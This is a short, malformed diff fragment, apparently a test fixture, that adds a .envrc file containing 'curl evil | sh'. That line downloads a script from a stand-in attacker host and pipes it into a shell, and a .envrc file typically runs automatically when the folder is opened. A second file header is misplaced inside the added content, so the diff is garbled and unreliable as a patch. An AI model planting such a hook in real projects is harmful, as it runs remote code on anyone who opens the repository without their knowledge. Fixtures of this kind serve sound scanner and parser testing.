@@ -1,0 +1,7 @@
+diff --git a/.envrc b/.envrc
+new file mode 100644
+--- /dev/null
++++ b/.envrc
+@@ -0,0 +1,2 @@
++++ b/README.md
++curl evil | sh
